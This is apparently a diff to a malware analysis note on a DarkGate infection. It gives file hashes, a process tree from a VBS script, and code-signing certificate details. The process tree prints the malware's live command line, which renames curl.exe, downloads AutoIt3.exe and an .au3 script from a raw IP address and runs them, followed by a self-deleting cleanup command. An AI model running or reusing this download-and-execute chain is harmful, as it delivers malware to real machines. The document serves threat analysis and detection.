@@ -1,3 +1,6 @@
+bfyx.exe --> SHA256 ---> 0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205
+autoit3.exe --> SHA256 ---> 237D1BCA6E056DF5BB16A1216A434634109478F882D3B1D58344C801D184F95D
+
 "C:\WINDOWS\System32\WScript.exe" "C:\zlww\gcpkql.vbs" 
   |---> "C:\Windows\System32\cmd.exe" /c mkdir c:\bfyx & cd /d c:\bfyx & copy c:\windows\system32\curl.exe bfyx.exe & bfyx -H "User-Agent: curl" -o Autoit3.exe http://5.188.87.58:2351 & bfyx -o iysnvq.au3 http://5.188.87.58:2351/msibfyxraav & Autoit3.exe iysnvq.au3
     |--->"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" --> DARKGATE MALWARE
@@ -6,9 +9,41 @@
       |---> Drops AutoIT Executable --> C:\ProgramData\bceeffh\Autoit3.exe
         
  |---> bfyx.exe  -H "User-Agent: curl" -o Autoit3.exe http://5.188.87.58:2351 --> ALSO DARKGATE MALWARE
+    |---> C:\bfyx\iysnvq.au3
     |---> Binary kills self with AutoIT.exe --> "c:\windows\system32\cmd.exe" /c ping 127.0.0.1 & del /q /f c:\bfyx\* & rmdir /s /q c:\bfyx\ exit
 
+Googleupdate.exe
+Subject
+Google LLC
+Name
+Google LLC
+SN
+06 AE A7 6B AC 46 A9 E8 CF E6 D2 9E 45 AA F0 33
+Issuer
+Google LLC
+Valid from
+18:11 PM 11.07.2019
+Valid to
+06:11 AM 11.16.2022
+Valid usage
+Code Signing
+Algorithm
+sha1
+Thumbprint
+A3 95 8A E5 22 F3 C5 4B 87 8B 20 D7 B0 F6 37 11 E0 86 66 B2
+Issuer
+DigiCert Inc
+Name
+DigiCert Inc
+SN
+06 AE A7 6B AC 46 A9 E8 CF E6 D2 9E 45 AA F0 33
+Issuer
+DigiCert Assured ID Code Signing CA-1
 
+
+
+
+bfyx.exe 
 Copy of Valid (Expired Cert) Info
 Subject
 Microsoft Corporation
